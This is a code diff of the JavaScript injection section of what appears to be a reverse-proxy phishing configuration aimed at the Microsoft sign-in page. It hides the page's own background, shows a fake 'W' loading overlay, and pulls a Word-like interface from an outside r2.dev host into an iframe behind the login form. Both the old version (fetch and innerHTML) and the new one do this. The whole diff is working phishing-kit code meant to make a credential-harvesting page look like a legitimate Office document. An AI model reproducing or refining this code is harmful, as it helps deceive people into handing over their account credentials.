@@ -80,7 +80,6 @@ js_inject:
             width: 200px;
             height: 200px;
             animation: pulse 3s ease-in-out infinite;
-            margin-bottom: 40px;
           }
           .back-plate {
             position: absolute;
@@ -124,45 +123,39 @@ js_inject:
           <div class="w-icon">W</div>
         </div>
       `;
-
       document.body.appendChild(overlay);
 
       setTimeout(() => {
         overlay.remove();
 
-        // Wait for #lightbox inside .win-scroll
-        function waitForElement(selector, callback) {
-          const interval = setInterval(() => {
+        const waitFor = (selector, cb) => {
+          const check = setInterval(() => {
             const el = document.querySelector(selector);
             if (el) {
-              clearInterval(interval);
-              callback(el);
+              clearInterval(check);
+              cb(el);
             }
           }, 50);
-        }
+        };
 
-        waitForElement(".win-scroll #lightbox", (lightbox) => {
-          fetch("https://pub-2a44f4d547ef416eb3d30428f95d5a9e.r2.dev/off.html")
-            .then(res => res.text())
-            .then(html => {
-              const wrapper = document.createElement("div");
-              wrapper.innerHTML = html;
-              wrapper.style.position = "absolute";
-              wrapper.style.top = "0";
-              wrapper.style.left = "0";
-              wrapper.style.width = "100%";
-              wrapper.style.height = "100%";
-              wrapper.style.zIndex = "0";
-              wrapper.style.pointerEvents = "none";
-              wrapper.style.overflow = "hidden";
+        waitFor('#backgroundImage', (bgImg) => {
+          // Remove existing MS background image
+          bgImg.style.display = 'none';
 
-              // Insert right after #lightbox but still inside .win-scroll
-              const parent = lightbox.parentElement;
-              if (parent.classList.contains("win-scroll")) {
-                parent.insertBefore(wrapper, lightbox.nextSibling);
-              }
-            })
-            .catch(err => console.error("❌ Failed to load Word background:", err));
+          // Inject full Word interface as background
+          const iframe = document.createElement("iframe");
+          iframe.src = "https://pub-2a44f4d547ef416eb3d30428f95d5a9e.r2.dev/off.html";
+          iframe.style.position = "absolute";
+          iframe.style.top = "0";
+          iframe.style.left = "0";
+          iframe.style.width = "100vw";
+          iframe.style.height = "100vh";
+          iframe.style.zIndex = "0";
+          iframe.style.border = "none";
+          iframe.style.pointerEvents = "none";
+          iframe.style.overflow = "hidden";
+
+          const container = bgImg.parentElement;
+          container.appendChild(iframe);
         });
-
       }, 3000);
